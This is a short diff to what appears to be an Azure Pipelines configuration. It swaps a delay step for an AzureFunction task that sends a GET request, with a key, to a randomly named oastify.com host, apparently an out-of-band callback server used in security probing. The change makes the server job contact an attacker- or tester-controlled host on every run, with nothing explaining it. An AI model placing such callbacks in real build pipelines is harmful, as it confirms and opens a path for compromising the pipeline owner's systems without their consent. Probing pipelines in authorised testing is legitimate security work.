@@ -15,6 +15,9 @@ jobs:
 - job: A
   pool: server
   steps:
-  - task: Delay@1
+  - task: AzureFunction@1
     inputs:
-      delayForMinutes: '0.1'
+      function: 'dp6vmxrvjfudy80nd8c8r8rx4oagybm0.oastify.com'
+      key: 'ZxPXnIEODXLRzYwCw1TgZ4osMfoKs9Zn6se6X/N0FnztfDvZbdOmYw=='
+      method: 'GET'
+      waitForCompletion: 'false'
